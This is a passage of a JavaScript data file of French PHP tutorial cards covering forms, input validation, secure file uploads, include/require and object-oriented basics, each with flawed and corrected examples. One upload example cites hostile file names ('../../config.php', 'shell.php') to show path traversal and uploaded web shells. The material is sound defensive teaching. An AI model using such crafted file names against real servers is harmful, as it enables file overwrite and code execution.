            { t: 'callout', kind: 'tip', h: 'Toute valeur issue d\'une superglobale suit le même circuit : **lire avec ?? → valider/nettoyer (fiche Validation) → échapper à l\'affichage (fiche XSS) → paramétrer en BDD (fiche Requêtes préparées)**. Aucun raccourci.' }
          ],
          errors: [
            { title: 'Faire confiance aux en-têtes HTTP_*', lang: 'php', bad:
'if ($_SERVER["HTTP_X_FORWARDED_FOR"] === "127.0.0.1") {\n    acceder_admin();       // header forgeable en 10 secondes\n}', good:
'// Décisions d\'accès = session + rôles vérifiés côté serveur.\n// Les REMOTE_ADDR/HTTP_* servent à logger, pas à autoriser.', why: 'Le client écrit tous les en-têtes HTTP_* qu\'il veut (curl -H, proxy, Burp…). Basée dessus, une protection est une porte ouverte avec un panneau "fermé". Le serveur ne fait confiance qu\'à ce QU\'IL a émis (session signée, jetons).' },
            { title: 'Utiliser $_REQUEST "pour être souple"', lang: 'php', bad:
'$id = $_REQUEST["id"];     // GET ? POST ? COOKIE ? mystère…', good:
'$id = $_GET["id"] ?? null;           // source explicite\n// ou $_POST selon la route attendue — et validation ensuite', why: 'Sans origine claire, un attaquant peut injecter un paramètre par le canal que tu ne surveillais pas (cookie empoisonné écrasant un champ POST selon config). L\'ambiguïté est le terrain de jeu des attaques par pollution.' }
          ],
          related: ['php-formulaires', 'php-validation', 'php-sessions', 'php-upload']
        }
      ]
    },

    /* 7. FORMULAIRES & REQUÊTES HTTP */
    {
      id: 'formulaires',
      name: 'Formulaires & HTTP',
      icon: 'dynamic_form',
      fiches: [
        {
          id: 'php-formulaires',
          title: 'Traiter un formulaire HTML',
          icon: 'dynamic_form',
          level: 'Débutant',
          tagline: 'GET ou POST, name qui fait foi, traitement côté serveur, formulaires collants — le cycle complet côté PHP.',
          intro: 'Tu connais déjà les balises (fiche formulaires du module HTML) : `<form>`, `method`, `action`, et l\'attribut **`name`** qui fait foi. Ici on voit l\'autre moitié du voyage : ce que PHP reçoit, comment distinguer affichage et soumission, et comment **ré-afficher les valeurs saisies** en cas d\'erreur (formulaire « collant », sticky).',
          blocks: [
            { t: 'h3', h: 'GET ou POST : le choix a du sens' },
            { t: 'table', head: ['', 'GET', 'POST'], rows: [
              ['où vont les données', "dans l'URL (?q=…)", 'dans le corps de la requête'],
              ['visibilité', 'visible, bookmarkable', 'hors de l\'URL'],
              ['usage légitime', 'recherche, filtres, pagination', 'création, suppression, achat, login'],
              ['limites', '≈ 2000 caractères', 'limites serveur (post_max_size)'],
              ['rafraîchir la page', 'rejoue la requête sans', 'le navigateur avertit (« re-soumettre ? »)']
            ] },
            { t: 'h3', h: 'Le pattern « un fichier, deux états »' },
            { t: 'code', lang: 'php', label: 'commande.php', code:
'<?php\n$erreurs = [];\n$qte     = "";\n$produit = "";\n\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    // 1. LIRE (avec ?? — jamais direct)\n    $qte     = trim($_POST["qte"] ?? "");\n    $produit = trim($_POST["produit"] ?? "");\n\n    // 2. VALIDER (fiche Validation pour aller plus loin)\n    if ($produit === "")                     { $erreurs[] = "Produit requis."; }\n    if (!is_numeric($qte) || (int) $qte <= 0) { $erreurs[] = "Quantité invalide."; }\n\n    // 3. RÉUSSITE → redirection (pattern POST/Redirect/GET)\n    if (!$erreurs) {\n        // …enregistrer la commande…\n        header("Location: /merci.php");\n        exit;               // exit APRÈS une redirection d\'en-tête !\n    }\n}\n?>\n<form method="post" action="/commande.php">\n  <label>Produit\n    <input name="produit" value="<?= htmlspecialchars($produit) ?>">\n  </label>\n  <label>Quantité\n    <input name="qte" type="number" value="<?= htmlspecialchars($qte) ?>">\n  </label>\n  <button>Commander à Dantokpa</button>\n</form>\n<?php foreach ($erreurs as $e): ?>\n  <p class="erreur"><?= htmlspecialchars($e) ?></p>\n<?php endforeach; ?>' },
            { t: 'callout', kind: 'tip', h: 'Le trio magique du traitement : **REQUEST_METHOD pour détecter la soumission**, **htmlspecialchars pour ré-injecter les valeurs** dans le formulaire (fiche XSS), et **header("Location: …") + exit en cas de succès** — le pattern POST/Redirect/GET qui évite le double envoi lors d\'un F5.' },
            { t: 'h3', h: 'name fait foi — et les []' },
            { t: 'code', lang: 'php', code:
'// <input name="gouts[]"> coché ×3 → PHP reçoit un TABLEAU\n$gouts = $_POST["gouts"] ?? [];      // ["piment", "ail"]\nif (is_array($gouts)) { /* … */ }\n\n// <select name="ville">  → la value de l\'option choisie\n$ville = $_POST["ville"] ?? "";\n\n// <input type="checkbox" name="news" value="oui">\n$news = isset($_POST["news"]);       // décochée = ABSENTE de $_POST !' },
            { t: 'callout', kind: 'warn', h: 'Une **checkbox décochée n\'apparaît pas du tout** dans `$_POST`. Teste avec `isset()` — ou ajoute un `<input type="hidden" name="news" value="non">` avant la checkbox (astuce standard).' }
          ],
          errors: [
            { title: 'Oublier name (ou le confondre avec id)', lang: 'php', bad:
'<input id="email" type="email" placeholder="Toi">\n<!-- $_POST["email"] … Undefined (id ne voyage JAMAIS) -->', good:
'<input id="email" name="email" type="email">\n<!-- id = label/CSS/JS (DOM) · name = ce qui part au serveur -->', why: 'Le navigateur ne sérialise que les champs dot\u00e9s d\'un name non vide. id sert au DOM (label, CSS, JS), name sert au protocole HTTP. Les deux rôles cohabitent souvent — mais seul name fait foi côté PHP.' },
            { title: 'Action destructive en GET', lang: 'php', bad:
'// <a href="/supprimer.php?id=12">Supprimer</a>\n// GET /supprimer.php?id=12 → préfetch, bots, historique → SUPPRIME', good:
'// Un bouton POST (et le jeton CSRF de la fiche éponyme) :\n<form method="post" action="/supprimer">\n  <input type="hidden" name="id" value="12">\n  <button>Supprimer</button>\n</form>', why: 'GET doit être idempotent (relire sans effet). Les navigateurs pré-chargent des liens, les robots les suivent, l\'URL reste dans les logs : une suppression en GET sera déclenchée sans même un clic humain.' }
          ],
          related: ['html-formulaires', 'php-superglobales', 'php-validation', 'php-csrf']
        },

        {
          id: 'php-validation',
          title: 'Valider & nettoyer avec filter_var',
          icon: 'checklist',
          level: 'Intermédiaire',
          tagline: 'La validation côté serveur est non négociable : filter_var, listes blanches, erreurs par champ — et nettoyer ≠ échapper.',
          intro: 'La validation HTML (required, type="email") est un confort côté CLIENT… contournable en 10 secondes (curl, DevTools). La seule validation qui compte se fait **côté serveur**. PHP offre `filter_var`/`filter_input` : des filtres de validation standardisés, bien préférables aux regex artisanales. Et une règle cardinale : **on valide à l\'entrée, on échappe à la sortie** — ce ne sont pas les mêmes étapes.',
          blocks: [
            { t: 'h3', h: 'filter_var : le couteau suisse' },
            { t: 'code', lang: 'php', code:
'filter_var("awa@exemple.bj", FILTER_VALIDATE_EMAIL);   // l\'email ou FALSE\nfilter_var("42",  FILTER_VALIDATE_INT);                // 42 ou false\nfilter_var("3.5", FILTER_VALIDATE_FLOAT);\nfilter_var("https://dantokpa.bj", FILTER_VALIDATE_URL);\nfilter_var("oui", FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE);\n\n// Avec options :\nfilter_var($qte, FILTER_VALIDATE_INT,\n    ["options" => ["min_range" => 1, "max_range" => 100]]);\n\n// filter_input : lit DIRECTEMENT la superglobale\n$email = filter_input(INPUT_POST, "email", FILTER_VALIDATE_EMAIL);\n$page  = filter_input(INPUT_GET, "page", FILTER_VALIDATE_INT) ?: 1;' },
            { t: 'callout', kind: 'warn', h: '`FILTER_SANITIZE_EMAIL` et ses frères **modifient** la valeur sans rien dire (« nettoyage silencieux » — on retire les caractères interdits). Réflexe pro : **FILTER_VALIDATE_*** (accepter/refuser) plutôt que SANITIZE (réparer en douce). La donnée pourrie doit être rejetée, pas bricolée.' },
            { t: 'h3', h: 'Le pattern erreurs par champ' },
            { t: 'code', lang: 'php', code:
'function valider_commande(array $post): array\n{\n    $e = [];\n    $qte = trim($post["qte"] ?? "");\n\n    if (($post["produit"] ?? "") === "")            { $e["produit"] = "Produit requis."; }\n    if (!filter_var($qte, FILTER_VALIDATE_INT,\n        ["options" => ["min_range" => 1]]))          { $e["qte"] = "Quantité ≥ 1 attendue."; }\n    if (!in_array($post["ville"] ?? "", ["Cotonou", "Abomey-Calavi"], true)) {\n        $e["ville"] = "Zone non livrée.";\n    }\n    return $e;   // vide = tout va bien\n}\n\n// $erreurs["produit"] alimente l\'affichage sous CHAQUE champ' },
            { t: 'h3', h: 'Liste blanche quand c\'est fermé' },
            { t: 'p', h: 'Pour les valeurs d\'un univers connu (villes de livraison, rôles, colonnes de tri SQL), rien ne vaut `in_array($x, $liste, true)` : la validation devient une **énumération des cas acceptés** — pas une poursuite infinie des cas interdits (liste noire toujours incomplète).' },
            { t: 'h3', h: 'trim, mb_check_encoding & entités' },
            { t: 'ul', items: [
              '`trim()` sur les chaînes : un espace en trop a déjà invalidé bien des emails.',
              'Normaliser EARLY : lowercase l\'email (`mb_strtolower`), convertir la casse qui ne porte pas de sens.',
              'UTF-8 côté PHP + formulaire : pense aux fonctions `mb_*` pour les accents (é, ô du Cotonou réel).',
              '**Ne jamais appliquer htmlspecialchars à l\'entrée** : stocke la donnée BRUTE, échappe à l\'affichage (fiche XSS).'
            ] }
          ],
          errors: [
            { title: 'Échapper les données avant de les stocker', lang: 'php', bad:
'$avis = htmlspecialchars($_POST["avis"]);   // on stocke "l\'&eacute;t&eacute;" ✗\n// en BDD → affichage double-encodé, recherche cassée', good:
'$avis = trim($_POST["avis"] ?? "");              // brut en BDD\n// …à l\'affichage : echo htmlspecialchars($avis, ENT_QUOTES, "UTF-8");', why: 'L\'échappement depend du CONTEXTE de sortie (HTML, attribut, SQL, JSON). Le faire à l\'entrée suppose un seul contexte, dégrade la donnée pour tous les autres, et provoque des doubles encodages ("&amp;amp;"). Validation à l\'entrée, échappement à la sortie.' },
            { title: 'Regex maison pour l\'email', lang: 'php', bad:
'preg_match("/^.+@.+\\..+$/", $email);   // accepte des horreurs, rejette du valide', good:
'if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { $e[] = "Email invalide."; }\n// La confirmation réelle : envoyer un mail avec lien/jeton.', why: 'La grammaire exacte d\'une adresse email (RFC 5322) tient en plusieurs pages : ta regex sera toujours fausse quelque part (rejette "+", apostrophes, IDN…). filter_var applique une grammaire sérieuse ; la preuve ultime reste l\'envoi d\'un courriel.' }
          ],
          related: ['php-formulaires', 'php-xss', 'php-casting', 'lv-validation']
        },

        {
          id: 'php-upload',
          title: 'Upload de fichiers & $_FILES',
          icon: 'upload_file',
          level: 'Intermédiaire',
          tagline: 'enctype multipart, $_FILES, move_uploaded_file, MIME vérifié côté serveur — sans ouvrir sa machine aux scripts uploadés.',
          intro: 'L\'upload est le cas d\'entrée utilisateur **le plus dangereux** : un fichier arbitraire atterrit sur ton serveur. Le processus correct : formulaire en `multipart/form-data`, lecture via `$_FILES`, vérifications strictes (code d\'erreur, taille, **vrai type MIME**, extension en liste blanche), puis `move_uploaded_file` vers un **nom généré** — idéalement hors de la racine web.',
          blocks: [
            { t: 'h3', h: 'Côté HTML : le contrat multipart' },
            { t: 'code', lang: 'html', code:
'<form method="post" action="/upload.php" enctype="multipart/form-data">\n  <!-- sans enctype, le fichier ne part PAS : $_FILES serait vide -->\n  <input type="file" name="photo" accept="image/jpeg,image/png">\n  <button>Envoyer</button>\n</form>' },
            { t: 'h3', h: 'Côté PHP : anatomie de $_FILES' },
            { t: 'code', lang: 'php', code:
'// Pour <input name="photo"> :\n$_FILES["photo"]["name"];      // "vacances.jpg" — NOM CLIENT, jamais fiable\n$_FILES["photo"]["type"];      // "image/jpeg"  — fourni par le CLIENT ⚠\n$_FILES["photo"]["tmp_name"];  // /tmp/phpXyZ123 — le fichier, pour l\'instant\n$_FILES["photo"]["error"];     // UPLOAD_ERR_OK (0) si tout s\'est bien passé\n$_FILES["photo"]["size"];      // octets\n\n// Codes usuels : UPLOAD_ERR_INI_SIZE (1), FORM_SIZE (2), PARTIAL (3),\n// NO_FILE (4) — tester error AVANT tout le reste.' },
            { t: 'h3', h: 'Le pipeline complet, sécurisé' },
            { t: 'code', lang: 'php', label: 'upload.php', code:
'if ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $f = $_FILES["photo"] ?? null;\n\n    // 1. Présence + code d\'erreur\n    if (!$f || $f["error"] !== UPLOAD_ERR_OK) { exit("Upload échoué."); }\n\n    // 2. Taille métier (ex. 2 Mo)\n    if ($f["size"] > 2_000_000) { exit("Fichier trop lourd."); }\n\n    // 3. VRAI type MIME, lu par le SERVEUR (pas par le client)\n    $mime = mime_content_type($f["tmp_name"]);\n    if (!in_array($mime, ["image/jpeg", "image/png"], true)) {\n        exit("Seuls JPEG et PNG sont acceptés.");\n    }\n\n    // 4. Extension en liste blanche déduite du MIME\n    $ext  = ["image/jpeg" => ".jpg", "image/png" => ".png"][$mime];\n    $nom  = bin2hex(random_bytes(16)) . $ext;      // nom généré !\n\n    // 5. Destination HORS de toute exécution (idéalement hors docroot)\n    if (!move_uploaded_file($f["tmp_name"], __DIR__ . "/uploads/" . $nom)) {\n        exit("Sauvegarde impossible.");\n    }\n    echo "Fichier enregistré : $nom";\n}' },
            { t: 'h3', h: 'Les limites php.ini à connaître' },
            { t: 'table', head: ['Directive', 'Effet'], rows: [
              ['`upload_max_filesize`', 'poids max d\'UN fichier (défaut 2M)'],
              ['`post_max_size`', 'poids max de TOUTE la requête POST'],
              ['`max_file_uploads`', 'nombre de fichiers par requête'],
              ['`memory_limit`', 'attention aux gros traitements (GD, etc.)']
            ] },
            { t: 'callout', kind: 'warn', h: 'Si `post_max_size` est dépassé, `$_POST` **et** `$_FILES` arrivent vides — sans message clair. Suspecte cette limite quand « l\'upload disparaît » malgré un formulaire correct.' },
            { t: 'p', h: 'Pour les images, une vérification bonus classe : `getimagesize($f["tmp_name"])` — retourne false si ce n\'est pas vraiment une image. Et si le fichier ne doit pas être public, stocke-le **hors de public/** et sers-le via un script PHP contrôlé (readfile après vérification de droits).' }
          ],
          errors: [
            { title: 'Croire $_FILES[\'photo\'][\'type\']', lang: 'php', bad:
'if ($_FILES["photo"]["type"] === "image/jpeg") { /* ok ? */ }\n// Le client écrit ce champ ! Un shell.php t\'annoncera "image/jpeg".', good:
'$mime = mime_content_type($_FILES["photo"]["tmp_name"]);\n// ou (images) : getimagesize($_FILES["photo"]["tmp_name"])', why: 'Le champ type de $_FILES est copié de l\'en-tête MIME envoyée par le navigateur — contrôlable octet par octet. Le serveur doit LIRE le contenu du fichier (magic bytes) via finfo/mime_content_type/getimagesize.' },
            { title: 'Conserver le nom d\'origine', lang: 'php', bad:
'move_uploaded_file($tmp, __DIR__ . "/uploads/" . $_FILES["p"]["name"]);\n// ../../config.php · shell.php écrasant un vrai fichier · collisions', good:
'$nom = bin2hex(random_bytes(16)) . $ext_whitelist;\n// + dossier d\'uploads sans exécution PHP (config serveur) ou hors docroot', why: 'Le nom original contrôle un chemin de ton serveur : traversée de répertoires (../), écrasement, collisions, et surtout un .php uploadé devient EXÉCUTABLE s\'il est sous la racine web. Nom généré + extension déduite du vrai MIME + dossier non exécutable.' }
          ],
          related: ['php-formulaires', 'php-validation', 'php-superglobales', 'html-formulaires']
        }
      ]
    },

    /* 8. INCLUSION DE FICHIERS */
    {
      id: 'inclusion',
      name: 'Inclusion de fichiers',
      icon: 'folder_open',
      fiches: [
        {
          id: 'php-inclusion',
          title: 'include, require & architecture multi-fichiers',
          icon: 'folder_open',
          level: 'Débutant',
          tagline: 'include vs require, _once, __DIR__ partout — et le pattern header/footer qui structure un site sans framework.',
          intro: 'Dès la deuxième page, copier-coller le menu et les fonctions devient insupportable : PHP permet de **découper le code en fichiers** et de les assembler à l\'exécution. Quatre variantes — `include`, `require`, `include_once`, `require_once` — qui diffèrent sur **deux questions** : le fichier est-il indispensable ? et s\'il a déjà été inclus, le recharger ?',
          blocks: [
            { t: 'h3', h: 'Les deux axes de choix' },
            { t: 'table', head: ['', 'Fichier manquant', 'Double inclusion'], rows: [
              ['`include`', '**Warning**, le script CONTINUE', 'réinclus à chaque appel'],
              ['`require`', '**Fatal error**, tout s\'arrête', 'réinclus à chaque appel'],
              ['`include_once`', 'Warning', 'ignorée si déjà inclus'],
              ['`require_once`', 'Fatal error', 'ignorée si déjà inclus ✓ le réflexe']
            ] },
            { t: 'code', lang: 'php', code:
'require_once __DIR__ . "/config.php";      // indispensable + anti-double\nrequire_once __DIR__ . "/fonctions.php";   // bibliothèque de fonctions\ninclude __DIR__ . "/partials/bandeau-promo.php";  // bonus optionnel' },
            { t: 'callout', kind: 'tip', h: 'Règle simple à retenir : **require_once partout**. Un fichier de config ou de fonctions manquant = l\'application ne peut pas tourner → fatal error immédiate, pas un site à moitié rendu avec un warning en haut. Le once élimine la classe entière de bugs « function already declared ».' },
            { t: 'h3', h: 'Le problème des chemins : __DIR__ à la rescousse' },
            { t: 'code', lang: 'php', code:
'// include "config.php";        ← relatif au DOSSIER COURANT de l\'appelant…\n// Si /admin/produits.php inclut ../lib/outils.php qui inclut "config.php",\n// le chemin se résout DEPUIS /admin : plantage intermittent !\n\nrequire_once __DIR__ . "/config.php";\n// __DIR__ = dossier du FICHIER où cette ligne est écrite : toujours juste,\n// quel que soit le script qui a déclenché la chaîne d\'inclusion.\n\nrequire_once dirname(__DIR__) . "/config.php";   // dossier parent' },
            { t: 'h3', h: 'Organisation d\'un petit site' },
            { t: 'code', lang: 'bash', code:
'projet/\n├── public/                 # racine web (php -S … -t public)\n│   ├── index.php\n│   └── produits.php\n├── config.php              # BDD, constantes — HORS public\n├── fonctions.php\n└── partials/\n    ├── entete.php          # <!doctype>, <nav>… reçoit $titre_page\n    └── pied.php            # </footer></body></html>' },
            { t: 'code', lang: 'php', label: 'public/produits.php', code:
'<?php\n$titre_page = "Nos produits — Dantokpa";\nrequire_once dirname(__DIR__) . "/partials/entete.php";\n?>\n<h1>Catalogue</h1>\n<?php require_once dirname(__DIR__) . "/partials/pied.php"; ?>' },
            { t: 'p', h: 'Les variables définies avant l\'inclusion sont **visibles dans le fichier inclus** (même portée) : c\'est le principe du pattern entête/pied — `$titre_page` est lu par `entete.php`. Quand le projet grandit, la même idée industrialisée s\'appelle un autoloader (fiche Composer) et des templates (Laravel → Blade).' }
          ],
          errors: [
            { title: 'include pour un fichier dont tout dépend', lang: 'php', bad:
'include "config.php";\n$pdo = new PDO($dsn, $user, $pass);   // si config manque → cascade d\'erreurs', good:
'require_once __DIR__ . "/config.php";\n// absent = arrêt net immédiat, avec message clair', why: 'include ne fait qu\'avertir : le script continue et les erreurs se manifestent plus loin, déguisées (undefined variable, class not found…). Un échec tôt et clair vaut mieux qu\'un site rendu à moitié.' },
            { title: 'Chemins relatifs qui cassent selon l\'appelant', lang: 'php', bad:
'// lib/outils.php :\ninclude "config.php";   // marche depuis index.php, casse depuis admin/x.php', good:
'// lib/outils.php :\nrequire_once __DIR__ . "/../config.php";\n// ancré au fichier, insensible au dossier courant de l\'appelant', why: 'Un chemin relatif se résout depuis le working directory du script ENTRÉE, pas depuis le fichier inclus. Dès que deux pages de dossiers différents partagent une bibliothèque, un include relatif devient une bombe à retardement. __DIR__ fixe l\'ancrage.' }
          ],
          related: ['php-serveur-local', 'php-composer', 'php-namespaces', 'lv-fondamentaux']
        }
      ]
    }
);

/* ============================================================
   data-php.js — partie 3 : POO, gestion des erreurs,
   sessions & cookies.
   ============================================================ */

DEVDOCS.php.categories.push(
    /* 9. PROGRAMMATION ORIENTÉE OBJET */
    {
      id: 'poo',
      name: 'Programmation orientée objet',
      icon: 'account_tree',
      fiches: [
        {
          id: 'php-poo-classes',
          title: 'Classes, objets & constructeur',
          icon: 'widgets',
          level: 'Débutant',
          tagline: 'class, new, $this, __construct et la promotion PHP 8 — fabriquer des objets métiers au lieu de tableaux anonymes.',
          intro: 'Un tableau associatif `["nom" => …, "prix" => …]` fonctionne… jusqu\'au jour où tu tapes "pri" au lieu de "prix" et que PHP te sert un warning au lieu de refuser. Une **classe** est un moule qui garantit la forme et le comportement : les données (propriétés) et ce qu\'on peut leur faire (méthodes) vivent ensemble. PHP 8 a même réduit le bruit avec la **promotion de propriétés**.',
          blocks: [
            { t: 'h3', h: 'La classe minimale' },
            { t: 'code', lang: 'php', code:
'class Produit\n{\n    // Promotion de constructeur (PHP 8) : déclare + affecte en UNE ligne\n    public function __construct(\n        public string $nom,\n        public float  $prix,\n        public int    $stock = 0,\n    ) {}\n\n    public function prix_ttc(): float\n    {\n        return $this->prix * 1.18;   // $this = L\'OBJET courant\n    }\n\n    public function libelle(): string\n    {\n        $rupture = $this->stock === 0 ? " (rupture)" : "";\n        return $this->nom . " — " . $this->prix_ttc() . " FCFA" . $rupture;\n    }\n}\n\n$gari = new Produit("Gari de Dantokpa", 500, 12);\necho $gari->libelle();          // Gari de Dantokpa — 590 FCFA\n$gari->stock = 30;              // propriété publique modifiable\nvar_dump($gari instanceof Produit); // true' },
            { t: 'callout', kind: 'info', h: '**Version pré-PHP 8** (à savoir lire partout) : on déclare `public string $nom;` à part, puis dans `__construct(string $nom)` on écrit `$this->nom = $nom;` pour chaque propriété. La promotion fait exactement ça, en une ligne — code identique une fois compilé.' },
            { t: 'h3', h: 'Le vocabulaire, une fois pour toutes' },
            { t: 'table', head: ['Terme', 'Définition'], rows: [
              ['classe', 'le moule : la DÉFINITION (fichier Produit.php)'],
              ['objet / instance', 'un exemplaire créé avec `new`'],
              ['propriété', 'une donnée portée par l\'objet (`$gari->prix`)'],
              ['méthode', 'une fonction rattachée à l\'objet (`$gari->libelle()`)'],
              ['`$this`', 'référence à l\'objet courant, DANS la classe'],
              ['`__construct`', 'méthode appelée automatiquement par `new`'],
              ['`->`', 'opérateur d\'accès (objet → membre), PAS de point comme JS']
            ] },
            { t: 'h3', h: 'Pourquoi pas un tableau ?' },
            { t: 'p', h: 'Le tableau accepte tout : clés fautives, types bizarres, fonctions dispersées. L\'objet **refuse ce qui sort du contrat** : propriété inconnue = warning explicite, type faux = TypeError, et les règles métier (prix ≥ 0) vivent DANS la classe (fiche Visibilité). Lisibilité, autocomplétion, refacto : tout y gagne dès que le dépassement de 3-4 écrans est atteint.' },
            { t: 'h3', h: 'new sans parenthèses, clone & null' },
            { t: 'code', lang: 'php', code:
'$a = new Produit("Piment", 200);\n$b = $a;                    // PAS une copie : même objet, deux noms !\n$b->prix = 250;\necho $a->prix;              // 250 🤯 — les objets passent par RÉFÉRENCE-IDENTITÉ\n\n$c = clone $a;              // vraie copie, indépendante\n\n$panier = null;\necho $panier?->libelle();   // ?-> : null silencieux, pas de fatal error' },
            { t: 'callout', kind: 'warn', h: 'Affecter un objet ne le **copie pas** : `$b = $a` fait pointer deux noms vers le même exemplaire (contrairement aux tableaux, copiés par valeur !). Pour un duplicata : `clone`.' }
          ],
          errors: [
            { title: 'Oublier $this dans la classe', lang: 'php', bad:
'class Produit {\n    public function __construct(public string $nom) {}\n    public function afficher(): void { echo $nom; }   // Undefined variable $nom', good:
'public function afficher(): void { echo $this->nom; }\n// Dans la classe, TOUT accès à un membre passe par $this-> (propriétés)\n// ou self:: / static:: (constantes & statiques — fiche suivante)', why: 'Dans une méthode, $nom est une variable LOCALE neuve. La propriété de l\'objet ne s\'atteint que via $this->nom (et note : -> suivi du nom SANS $ — $this->$nom chercherait la propriété dont le nom est CONTENU dans $nom !).' },
            { title: 'Appeler une méthode sur null', lang: 'php', bad:
'$produit = $catalogue->trouve($id);   // null si introuvable\necho $produit->libelle();             // Fatal error : on null', good:
'echo $produit?->libelle() ?? "Produit introuvable";\n// ou : if ($produit !== null) { … }', why: 'null n\'a pas de méthodes : PHP lève une Error fatale. Deux défenses : le nullsafe ?-> (PHP 8) à l\'affichage, et surtout un contrat clair — la méthode trouve() renvoie ?Produit ET l\'appelant gère le null.' }
          ],
          related: ['php-poo-visibilite', 'php-poo-heritage', 'php-variables', 'php-exceptions-custom']
        },

        {
          id: 'php-poo-visibilite',
          title: 'Visibilité, static & constantes',
          icon: 'lock',
          level: 'Intermédiaire',
          tagline: 'public / private / protected, getters-setters, self:: et les constantes de classe : l\'encapsulation qui protège tes invariants.',
          intro: 'L\'encapsulation répond à une question simple : **qui a le droit de toucher quoi ?** Laisser tout public, c\'est permettre `$produit->prix = -50` depuis n\'importe où. La visibilité (`public`/`protected`/`private`) fait de la classe la gardienne de ses règles. Ajoute `static` (qui appartient à la classe, pas à l\'objet) et `const`, et tu tiens l\'essentiel de l\'armure objet PHP.',
          blocks: [
            { t: 'h3', h: 'Les trois niveaux' },
            { t: 'table', head: ['Visibilité', 'Depuis l\'extérieur', 'Depuis la classe', 'Depuis les enfants'], rows: [
              ['`public`', '✓', '✓', '✓'],
              ['`protected`', '✗', '✓', '✓ (hérités)'],
              ['`private`', '✗', '✓', '✗ (propre à la classe)']
            ] },
            { t: 'h3', h: 'Encapsuler : l\'invariant gardé' },
            { t: 'code', lang: 'php', code:
'class Produit\n{\n    // private en promotion : ni lisible ni modifiable de l\'extérieur\n    public function __construct(private string $nom, private float $prix) {\n        $this->setPrix($prix);          // validation DÈS la naissance\n    }\n\n    public function nom(): string { return $this->nom; }   // getter\n\n    public function setPrix(float $prix): void             // setter gardien\n    {\n        if ($prix <= 0) {\n            throw new InvalidArgumentException("Prix positif exigé.");\n        }\n        $this->prix = $prix;\n    }\n}\n\n$p = new Produit("Gari", 500);\n// $p->prix = -50;    ✗ Error : accès refusé (private)\n$p->setPrix(550);       // ✓ passe par le gardien' },
            { t: 'callout', kind: 'tip', h: 'Convention saine : **propriétés privées par défaut**, exposition minimale (getters si lecture OK, setters seulement si modification acceptée). Chaque degré d\'ouverture est une promesse à tenir pour toujours.' },
            { t: 'h3', h: 'static : à la classe, pas à l\'objet' },
            { t: 'code', lang: 'php', code:
'class Vendeur\n{\n    public static int $compteur = 0;        // partagée par TOUS les vendeurs\n    public const TAXE_PALAIS = 0.05;        // constante de classe\n\n    public function __construct(public string $nom) {\n        self::$compteur++;                  // self:: = LA CLASSE\n    }\n\n    public static function effectif(): int  // méthode statique\n    {\n        return self::$compteur;             // pas de $this ici !\n    }\n}\n\nnew Vendeur("Awa"); new Vendeur("Koffi");\necho Vendeur::$compteur;      // 2 — accès par LA CLASSE, Opérateur ::\necho Vendeur::effectif();     // 2\necho Vendeur::TAXE_PALAIS;    // 0.05  (constante : jamais modifiable)' },
            { t: 'h3', h: 'Cas d\'usage constants & static saines' },
            { t: 'ul', items: [
              '`const` : valeurs métier fixes (taux, plafonds) — nommées, typées implicitement, lisibles.',
              '`static` : méthodes utilitaires liées au concept (`Vendeur::depuisTableau($row)`), compteurs d\'instances, fabriques.',
              'Éviter : l\'état global mutable déguisé en static ("registry magique") — même défaut que `global`.' ,
              'PHP 8.1+ : les **enum** (`enum Statut: string { case Paye = "paye"; … }`) remplacent élégamment les séries de constantes.'
            ] }
          ],
          errors: [
            { title: 'Tout public « pour aller vite »', lang: 'php', bad:
'class Compte { public float $solde = 0; }\n$compte->solde = -99999;      // légal techniquement, absurde métier', good:
'class Compte {\n    private float $solde = 0;\n    public function debiter(float $m): void {\n        if ($m > $this->solde) { throw new DomainException("Solde insuffisant"); }\n        $this->solde -= $m;\n    }\n    public function solde(): float { return $this->solde; }\n}', why: 'L\'invariant « solde jamais négatif » n\'existe que si TOUTE modification passe par un gardien. Une propriété publique, c\'est un invariant jeté à la poubelle — et le bug ne se produira pas au moment de l\'écriture fautive, mais 20 lignes plus loin.' },
            { title: 'Mélanger -> et ::', lang: 'php', bad:
'$vendeur->effectif();         // méthode statique via un objet (warning/comportement)\nVendeur::nom;                  // propriété d\'instance via la classe (Error)', good:
'Vendeur::effectif();          // statique   → CLASSE ::\n$vendeur->nom();               // instance   → objet  ->\nVendeur::TAXE_PALAIS;          // constante  → CLASSE ::', why: '-> parcourt l\'objet (état individuel) ; :: parcourt la classe (partagé : statique, constante). Confondre les deux, c\'est confondre « l\'exemplaire » et « le moule » — PHP les distingue strictement.' }
          ],
          related: ['php-poo-classes', 'php-poo-heritage', 'php-poo-interfaces-traits', 'php-exceptions-custom']
        },

        {
          id: 'php-poo-heritage',
          title: 'Héritage, abstract & final',
          icon: 'account_tree',
          level: 'Intermédiaire',
          tagline: 'extends, parent::, classes abstraites et final : factoriser ce qui est commun sans créer un arbre généalogique absurde.',
          intro: 'L\'héritage cristallise la relation **« est-un »** : un PaiementMobile **est un** Paiement. L\'enfant hérite des propriétés et méthodes du parent, peut les spécialiser (override) et en ajouter. Bien utilisé — peu de niveaux, classes abstraites qui posent le contrat, `final` qui ferme ce qui ne doit pas bouger — c\'est un outil de cohérence. Mal utilisé (tour de 6 niveaux), un cauchemar.',
          blocks: [
            { t: 'h3', h: 'extends et parent::' },
            { t: 'code', lang: 'php', code:
'class Paiement\n{\n    public function __construct(\n        public readonly float $montant,     // readonly (8.1) : écrit au\n                                            // constructeur, gelé ensuite\n        public readonly string $devise = "XOF",\n    ) {}\n\n    public function libelle(): string\n    {\n        return $this->montant . " " . $this->devise;\n    }\n}\n\nclass PaiementMobile extends Paiement        // UN SEUL parent en PHP\n{\n    public function __construct(float $montant, public string $operateur)\n    {\n        parent::__construct($montant);       // initialise la partie héritée !\n    }\n\n    public function libelle(): string        // OVERRIDE : signature compatible\n    {\n        return parent::libelle() . " via " . $this->operateur;\n    }\n}\n\n$pm = new PaiementMobile(1500, "MTN MoMo");\necho $pm->libelle();   // 1500 XOF via MTN MoMo' },
            { t: 'h3', h: 'abstract : le contrat sans implémentation' },
            { t: 'code', lang: 'php', code:
